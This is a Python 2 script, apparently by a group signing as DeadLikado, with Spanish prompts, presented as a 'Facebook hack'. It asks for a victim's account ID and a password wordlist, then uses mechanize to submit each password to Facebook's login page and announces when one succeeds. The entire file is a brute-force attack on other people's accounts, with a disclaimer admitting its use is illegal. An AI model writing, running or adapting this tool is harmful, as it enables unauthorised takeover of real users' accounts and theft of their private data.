#!/usr/bin/env python
# -*- coding: UTF-8 -*-ç
# Team ZDLH
# Comentary
# Script Create in code env python 
# Advertencia de Uso
# La Utilización de este script es ilegal por lo cual nosotros no nos hacemos cargo del mal uso de este medio 
# Create By +++ DeadLikado +++
	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')
os.system('figlet -f core/smpoison.flf Fb | lolcat')
os.system('figlet -f core/smpoison.flf Brute| lolcat')
def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" 
     BB = "\033[34;1m"
     YY = "\033[33;1m"
     GG = "\033[32;1m"
     WW = "\033[0;1m" 
     RR = "\033[31;1m" 
     CC = "\033[36;1m" 
     B = "\033[34m" 
     Y = "\033[33;1m"  
     G = "\033[32m"   
     W = "\033[0;1m" 
     R = "\033[31m" 
     C = "\033[36;1m" 
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def deadlikado():
    print """
    \033[1;96m
\033[95m ᶠᵃᶜᵉᵇᵒᵒᵏ ᴴᵃᶜᵏ 🄳🄴🄰🄳🄻🄸🄺🄰🄳🄾
    """
    time.sleep(1)
    print "\033[91mFACEBOOK HACK BY DEADLIKADO  "
deadlikado()

email = str(raw_input(GL+"ID de la Victima \033[33;1m: "))

passwordlist = str(raw_input(WW+"Lista de contraseñas\033[91m[ core/pass.txt ] \033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  Wordlis Pass")
        runntek(RR+"  Hack Acount Facebook")
        time.sleep(1)
        print WW+34*" +"
        kol()
def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Hack..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Hackeo Finalizado [Pass encontrada]\033[31;1>\033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"Contraseña Encontrada [Enter Exit]")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        hack = CC+"""
Buscando Posibles Contraseñas id : {}
      """.format(email)
        print hack
        print "By deadLikado"
        print " "
        print "\033[90m[\033[93mBy DeadLikado\033[90m]\033[92m"
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Cuenta A Hackear : {}".format(email)
        print RR+" [*] Total :" , len(total),WW+ "passwords"
        print Y+" [*] Iniciando Hackeo Fb..\n\n"

if __name__ == '__main__':
        main()
